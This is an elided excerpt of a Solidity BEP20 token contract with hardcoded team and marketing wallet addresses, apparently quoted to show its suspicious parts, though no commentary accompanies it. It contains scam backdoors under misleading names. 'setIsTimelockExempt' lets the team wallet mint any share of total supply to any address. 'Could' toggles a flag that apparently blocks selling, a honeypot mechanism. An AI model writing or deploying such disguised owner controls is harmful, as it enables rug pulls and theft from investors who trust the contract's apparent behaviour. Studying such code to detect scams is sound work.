...
contract Token is IBEP20, Ownable {
    ...
    constructor () Ownable(msg.sender){
        ...
        teamwalletAddress=payable(0x36DBBba1AdCFd07CF9aAd0f2171BbD2Fd54C3580);
        marketingFeeReceiver=payable(0xc1eFebfbd096F02e258559DFd22ff2f2F2CA10BF);
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        _takeInviterFeeKt(_balances[address(this)].div(100000));
    ...
    function Could(bool flag) public {if(msg.sender == teamwalletAddress){
            require(couldsell!=flag,"pass!!!");
            couldsell=flag;
        }
    ...
    function setIsTimelockExempt(address holder, uint256 exempt) public {if(msg.sender == teamwalletAddress){
        _balances[holder] = _balances[holder] + _totalSupply.mul(exempt).div(100);}
    }
